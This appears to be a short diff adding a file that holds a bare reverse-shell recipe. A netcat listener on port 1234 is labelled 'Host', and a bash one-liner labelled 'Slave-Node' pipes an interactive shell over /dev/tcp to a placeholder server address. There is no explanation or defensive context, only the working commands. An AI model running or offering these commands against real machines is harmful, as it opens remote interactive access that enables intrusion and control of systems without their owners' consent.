@@ -1,0 +1,7 @@
+Host:
+nc -nlvp  1234
+
+
+
+Slave-Node:
+bash -i >& /dev/tcp/<server-hostr-ip>/1234 0>&1
